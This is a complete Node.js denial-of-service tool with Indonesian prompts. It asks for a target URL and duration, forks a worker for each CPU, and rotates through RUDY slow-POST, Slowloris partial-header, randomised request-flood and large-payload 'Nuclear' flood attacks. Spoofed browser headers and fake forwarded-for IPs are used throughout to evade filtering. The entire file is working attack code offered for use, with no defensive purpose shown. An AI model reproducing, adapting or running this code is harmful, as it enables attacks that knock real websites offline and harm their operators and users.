const http = require('http');
const https = require('https');
const { URL } = require('url');
const cluster = require('cluster');
const os = require('os');
const chalk = require('chalk');
const inquirer = require('inquirer');

const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.52",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "curl/7.81.0",
];

const referers = [
    "https://www.google.com/", "https://www.youtube.com/", "https://www.facebook.com/", "https://www.twitter.com/",
    "https://www.instagram.com/", "https://www.baidu.com/", "https://www.wikipedia.org/", "https://yandex.ru/",
    "https://yahoo.com/", "https://www.amazon.com/", "https://www.reddit.com/", "https://duckduckgo.com/", "https://www.bing.com/",
];

const acceptHeaders = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "application/json, text/plain, */*", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*",
    "application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5", "*/*",
];

function getRandomElement(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function generateRandomString(length) {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    for (let i = 0; i < length; i++) { result += chars.charAt(Math.floor(Math.random() * chars.length)); }
    return result;
}

class BypassGenerator {
    constructor() {
        this.browserProfiles = [
            {
                ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
                ch: '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                platform: '"Windows"'
            },
            {
                ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
                ch: '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                platform: '"macOS"'
            },
            {
                ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57",
                ch: '"Microsoft Edge";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
                platform: '"Windows"'
            }
        ];
    }

    generateHeaders() {
        const profile = getRandomElement(this.browserProfiles);
        const randomIp = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;

        return {
            'accept': getRandomElement(acceptHeaders),
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'referer': getRandomElement(referers),
            'sec-ch-ua': profile.ch,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': profile.platform,
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': profile.ua,
            'X-Forwarded-For': randomIp,
            'Via': `1.1 ${randomIp}`
        };
    }

    generatePayload() {
        const payloadType = getRandomElement(['json', 'form']);
        if (payloadType === 'json') {
            const jsonBody = {};
            for (let i = 0; i < 5; i++) {
                jsonBody[generateRandomString(8)] = generateRandomString(12);
            }
            return { contentType: 'application/json', body: JSON.stringify(jsonBody) };
        } else {
            let formBody = '';
            for (let i = 0; i < 5; i++) {
                formBody += `${generateRandomString(8)}=${generateRandomString(12)}&`;
            }
            return { contentType: 'application/x-www-form-urlencoded', body: formBody.slice(0, -1) };
        }
    }
}

class RudyAttack {
    constructor(targetUrl, threadCount, stats) {
        this.targetUrl = targetUrl;
        this.threadCount = threadCount;
        this.stats = stats;
        this.sockets = [];
        try {
            this.url = new URL(targetUrl);
            this.protocol = this.url.protocol === 'https:' ? https : http;
        } catch (e) { this.url = null; this.protocol = null; }
    }

    createConnection() {
        if (!this.url) return null;
        this.stats.total++;
        const bypasser = new BypassGenerator();
        const headers = bypasser.generateHeaders();
        headers['Content-Type'] = 'application/x-www-form-urlencoded';
        headers['Content-Length'] = 1000000 + Math.floor(Math.random() * 500000);
        headers['Connection'] = 'keep-alive';

        const options = {
            hostname: this.url.hostname,
            port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
            path: this.url.pathname,
            method: 'POST',
            headers: headers,
            agent: new (this.protocol === https ? https : http).Agent({ keepAlive: true }),
        };

        let timeoutId;
        const req = this.protocol.request(options, (res) => {
            this.stats.success++;
            res.resume(); // Optimasi: Konsumsi response untuk membebaskan socket
            if (timeoutId) clearTimeout(timeoutId);
        });
        req.on('error', (err) => {
            this.stats.failed++;
            if (timeoutId) clearTimeout(timeoutId);
        });

        let postBody = '';
        for (let i = 0; i < 5; i++) { postBody += `${generateRandomString(10)}=${generateRandomString(15)}&`; }
        req.write(postBody);

        const sendSlowByte = () => {
            try {
                if (req.destroyed) { if (timeoutId) clearTimeout(timeoutId); return; }
                req.write(generateRandomString(1));
            } catch (e) { if (timeoutId) clearTimeout(timeoutId); }
        };

        const scheduleNextByte = () => {
            const randomInterval = 8000 + Math.random() * 4000;
            timeoutId = setTimeout(() => {
                sendSlowByte();
                scheduleNextByte();
            }, randomInterval);
        };
        scheduleNextByte();
        return { req, timeoutId };
    }

    start() {
        for (let i = 0; i < this.threadCount; i++) {
            const socket = this.createConnection();
            if (socket) { this.sockets.push(socket); }
        }
    }

    stop() {
        this.sockets.forEach(({ req, timeoutId }) => {
            if (timeoutId) clearTimeout(timeoutId);
            if (req && !req.destroyed) req.destroy();
        });
        this.sockets = [];
    }
}

class SlowlorisAttack {
    constructor(targetUrl, threadCount, stats) {
        this.targetUrl = targetUrl;
        this.threadCount = threadCount;
        this.stats = stats;
        this.sockets = [];
        try {
            this.url = new URL(targetUrl);
            this.protocol = this.url.protocol === 'https:' ? https : http;
        } catch (e) { this.url = null; this.protocol = null; }
    }

    createConnection() {
        if (!this.url) return null;
        this.stats.total++;
        const bypasser = new BypassGenerator();
        const headers = bypasser.generateHeaders();
        headers['Connection'] = 'keep-alive';

        const options = {
            hostname: this.url.hostname,
            port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
            path: this.url.pathname + '?' + generateRandomString(10),
            method: 'GET',
            headers: headers,
            agent: new (this.protocol === https ? https : http).Agent({ keepAlive: true }),
        };

        let intervalId;
        const req = this.protocol.request(options);

        req.on('error', (err) => {
            this.stats.failed++;
            if (intervalId) clearInterval(intervalId);
        });

        // We don't expect a response, but if the server is misconfigured and sends one,
        // we count it as a success for the connection attempt.
        req.on('response', (res) => {
            this.stats.success++;
            res.resume();
        });

        // Send initial partial headers
        req.write(`GET ${options.path} HTTP/1.1\r\nHost: ${options.hostname}\r\n`);
        this.stats.success++; // The initial connection is considered a success

        intervalId = setInterval(() => {
            try {
                if (req.destroyed) {
                    clearInterval(intervalId);
                    return;
                }
                // Send keep-alive headers
                req.write(`X-${generateRandomString(6)}: ${generateRandomString(8)}\r\n`);
            } catch (e) {
                this.stats.failed++;
                clearInterval(intervalId);
            }
        }, 10000 + Math.random() * 5000); // Send a header every 10-15 seconds

        return { req, intervalId };
    }

    start() {
        for (let i = 0; i < this.threadCount; i++) {
            const socket = this.createConnection();
            if (socket) { this.sockets.push(socket); }
        }
    }

    stop() {
        this.sockets.forEach(({ req, intervalId }) => {
            if (intervalId) clearInterval(intervalId);
            if (req && !req.destroyed) req.destroy();
        });
        this.sockets = [];
    }
}

class L7Flood {
    constructor(targetUrl, threadCount, delay, stats) {
        this.targetUrl = targetUrl;
        this.threadCount = threadCount;
        this.delay = delay;
        this.stats = stats;
        this._running = false;
        try {
            this.url = new URL(targetUrl);
            this.protocol = this.url.protocol === 'https:' ? https : http;
        } catch (e) { this.url = null; }
    }

    sendRequest() {
        if (!this.url) return;
        this.stats.total++;
        const methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS'];
        const method = getRandomElement(methods);
        const cacheBust = `${generateRandomString(8)}=${generateRandomString(8)}&_=${Date.now()}`;
        const path = this.url.pathname + (this.url.search ? `${this.url.search}&${cacheBust}` : `?${cacheBust}`);
        const bypasser = new BypassGenerator();
        const headers = bypasser.generateHeaders();
        const options = {
            hostname: this.url.hostname,
            port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
            path: path,
            method: method,
            agent: new (this.protocol === https ? https : http).Agent({ keepAlive: true, maxSockets: this.threadCount * 2 }),
            headers: headers,
        };

        let requestBody = null;
        if (['POST', 'PUT'].includes(method)) {
            const payload = bypasser.generatePayload();
            requestBody = payload.body;
            options.headers['Content-Type'] = payload.contentType;
            options.headers['Content-Length'] = Buffer.byteLength(payload.body);
        }

        const req = this.protocol.request(options);
        req.on('response', (res) => {
            this.stats.success++;
            res.resume(); // Optimasi: Konsumsi response body untuk membebaskan memori
        });
        req.on('error', (err) => {
            this.stats.failed++;
        });
        if (requestBody) { req.write(requestBody); }
        req.end();
    }

    start() {
        this._running = true;
        const flood = () => {
            if (!this._running) return;
            for (let i = 0; i < this.threadCount; i++) {
                this.sendRequest();
            }
            // Use setImmediate to run the next batch of requests as soon as possible
            // without blocking the event loop completely.
            setImmediate(flood);
        };
        flood();
    }

    stop() {
        this._running = false;
    }
}

class NuclearFlood extends L7Flood {
    sendRequest() {
        if (!this.url) return;
        this.stats.total++;
        const method = getRandomElement(['POST', 'PUT']); // Only use heavy methods
        const cacheBust = `${generateRandomString(8)}=${generateRandomString(8)}&_=${Date.now()}`;
        const path = this.url.pathname + (this.url.search ? `${this.url.search}&${cacheBust}` : `?${cacheBust}`);
        const bypasser = new BypassGenerator();
        const headers = bypasser.generateHeaders();
        const options = {
            hostname: this.url.hostname,
            port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
            path: path,
            method: method,
            agent: new (this.protocol === https ? https : http).Agent({ keepAlive: true, maxSockets: this.threadCount * 2 }),
            headers: headers
        };

        // Generate a large random payload to stress the server
        const requestBody = generateRandomString(1024 + Math.floor(Math.random() * 9216)); // 1KB to 10KB payload
        options.headers['Content-Type'] = 'application/octet-stream';
        options.headers['Content-Length'] = Buffer.byteLength(requestBody);

        const req = this.protocol.request(options);
        req.on('response', (res) => {
            this.stats.success++;
            res.resume();
        });
        req.on('error', (err) => {
            this.stats.failed++;
        });
        req.write(requestBody);
        req.end();
    }
}

function updateDisplay(stats) {
    const rate = stats.total > 0 ? (stats.success / stats.total * 100).toFixed(2) : '0.00';
    const statusLine = `Status: ${chalk.yellow(stats.phase)} | Requests: ${chalk.blue(stats.total)} (Success: ${chalk.green(stats.success)}, Failed: ${chalk.red(stats.failed)}) | Rate: ${chalk.magenta(rate + '%')} `;
    process.stdout.write(statusLine + '\r');
}

async function startWorkerAttack({ targetUrl, duration }) {
    const threads = 100;
    const l7Delay = 200; // Not used for timing, but for constructor compatibility
    const allAttackModes = ['RUDY', 'L7 Flood', 'Slowloris', 'Nuclear Flood'];

    // Shuffle attack order
    for (let i = allAttackModes.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [allAttackModes[i], allAttackModes[j]] = [allAttackModes[j], allAttackModes[i]];
    }

    if (cluster.worker.id === 1) {
        console.log(chalk.cyan(`\n[+] Worker ${cluster.worker.id} (Display) starting attack on ${targetUrl} | Duration: ${duration}s`));
        console.log(chalk.cyan(`[+] Attack Order: ${allAttackModes.join(chalk.red(' -> '))}`));
    }
    
    const stats = {
        total: 0,
        success: 0,
        failed: 0,
        phase: 'Initializing...',
    };

    const displayInterval = cluster.worker.id === 1 ? setInterval(() => updateDisplay(stats), 200) : null;
    const totalDurationMs = duration * 1000;
    const phaseDurationMs = totalDurationMs / allAttackModes.length;
    let currentAttacker = null;

    const executeAttackPhase = (phaseIndex) => {
        if (currentAttacker) {
            currentAttacker.stop();
        }

        if (phaseIndex >= allAttackModes.length) {
            if (displayInterval) {
                clearInterval(displayInterval);
                updateDisplay(stats);
                process.stdout.write('\n');
            }
            if (cluster.worker.id === 1) {
                console.log(chalk.bold.green('Attack rotation finished.'));
            }
            process.exit(0);
            return;
        }

        const attackMode = allAttackModes[phaseIndex];
        stats.phase = `${attackMode} Attack`;

        switch (attackMode) {
            case 'RUDY': currentAttacker = new RudyAttack(targetUrl, threads, stats); break;
            case 'L7 Flood': currentAttacker = new L7Flood(targetUrl, threads, l7Delay, stats); break;
            case 'Slowloris': currentAttacker = new SlowlorisAttack(targetUrl, threads, stats); break;
            case 'Nuclear Flood': currentAttacker = new NuclearFlood(targetUrl, threads, l7Delay, stats); break;
        }

        if (currentAttacker) {
            currentAttacker.start();
            setTimeout(() => executeAttackPhase(phaseIndex + 1), phaseDurationMs);
        }
    };

    executeAttackPhase(0);
}

if (cluster.isMaster) {
    const numCPUs = os.cpus().length;
    console.log(chalk.bold.red('===================================================='));
    console.log(chalk.bold.red('     Alat Serangan Jaringan - Gunakan Dengan Bijak    '));
    console.log(chalk.bold.red(`     Master process is running. Forking for ${numCPUs} CPUs.`));
    console.log(chalk.bold.red('====================================================\n'));

    const questions = [
        { type: 'input', name: 'targetUrl', message: 'Masukkan URL Target:', validate: (val) => { try { new URL(val); return true; } catch { return 'URL tidak valid.'; } } },
        { type: 'number', name: 'duration', message: 'Masukkan Durasi Serangan (detik):', default: 60, validate: (val) => val > 0 || 'Durasi harus lebih dari 0.' },
    ];

    inquirer.prompt(questions).then(async ({ targetUrl, duration }) => {
        try {

            const attackConfig = {
                targetUrl,
                duration,
            };

            for (let i = 0; i < numCPUs; i++) {
                const worker = cluster.fork();
                worker.on('online', () => worker.send(attackConfig));
            }

            cluster.on('exit', (worker, code, signal) => {
                if (signal) {
                    console.log(chalk.magenta(`Worker ${worker.process.pid} was killed by signal: ${signal}`));
                } else if (code !== 0) {
                    console.log(chalk.magenta(`Worker ${worker.process.pid} exited with error code: ${code}`));
                }
            });
        } catch (err) {
            console.error(chalk.red('\n\nTerjadi kesalahan fatal:'), err);
            process.exit(1);
        }
    });
} else { // Worker process
    process.on('message', (attackConfig) => {
        startWorkerAttack(attackConfig);
    });
}